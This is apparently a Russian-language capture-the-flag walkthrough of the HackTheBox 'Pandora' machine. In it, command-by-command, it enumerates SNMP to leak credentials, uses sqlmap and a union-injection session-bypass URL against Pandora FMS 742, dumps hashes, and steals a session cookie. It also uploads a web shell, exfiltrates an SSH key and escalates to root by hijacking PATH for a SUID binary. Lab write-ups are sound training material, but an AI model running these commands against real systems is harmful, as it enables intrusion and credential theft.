спасибо [хактриксам](https://book.hacktricks.xyz/pentesting/pentesting-snmp)

на 80 порту ничего интересного не было, поискал директории, поигрался с формой для фидбека и пошарил по /assets

сканируем udp порты, топ 20 т.к. сканирование и так супер медленное

`sudo nmap -sU --top-ports=20 panda.htb`

сканируем открытый порт, висит snmp

`sudo nmap -sUV -T4 -p 161 panda.htb`

брутим community strings

`sudo nmap -sU -p 161 --script snmp-brute panda.htb --script-args snmp-brute.communitiesdb=./wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt`

енумератим snmp

`snmpwalk -v 1 -c <string> panda.htb .1`

креды юзера

`-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23`

`daniel:HotelBabylon23`

я доискался до директории `/var/www/pandora`

`cat /etc/hosts`

вывод

`127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb`

`127.0.1.1 pandora`

создаем динамический туннель, чтобы подключиться к `localhost.localdomain/pandora_console`

`ssh -D 9090 daniel@panda.htb`

или

`ssh -L 80:localhost:80 daniel@panda.htb`

прокси socks5

заходим и видим версию pandora fms v7.0NG.742_FIX_PERL2020

гуглим pandora fms 742 vuln

https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

ого, скульмап овер прокси

`sqlmap --url "http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" --random-agent --proxy socks5://127.0.0.1:9090`

доходим до такого

`sqlmap --url "http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" --random-agent --proxy socks5://127.0.0.1:9090 -D pandora -T tpassword_history --dump`

получаем хеши

`matt:f655f807365b6dc602b31ab3d6d43acc`

`daniel:76323c174bd49ffbbdedf678f6cc89a6`

`--os-shell` не сработал

есть еще интересное название `tsessions_php`

тырим куку и вставляем у себя в браузере

`g4e01qdgk36mfdh90hvcc54umq,"id_usuario|s:4:""matt"";alert_msg|a:0:{}new_chat|b:0;",1638796349`

у мэтта нет доступа к загрузке файлов, так что гуглим дальше

pandora fms 742 exploit

https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py

`http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO%27`

хороший url

теперь есть доступ к админской панели

загружаем туда шелл

делаем ревшелл

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`export TERM=xterm`

логинимся чз ssh

`ssh-keygen -t rsa`

`cat .ssh/id_rsa.pub > .ssh/authorized_keys`

`chmod 700 .ssh`

`chmod 600 .ssh/authorized_keys`

`python3 -m http.server 1233 &`

на своей машине

`http://0.0.0.0:1233/.ssh/id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa matt@10.10.11.136`

дальше suid бинари...

`find / -user root -perm -4000 -exec ls -ldb {} \; >/tmp/suidfiles`

`pandora_backup` юзает `tar`

делаем фейк `tar`

`echo "/bin/bash" > tar`

`chmod +x tar`

`export $PATH=$(pwd):$PATH`

запускаем бинарь и получаем рут

`/usr/bin/pandora_backup`
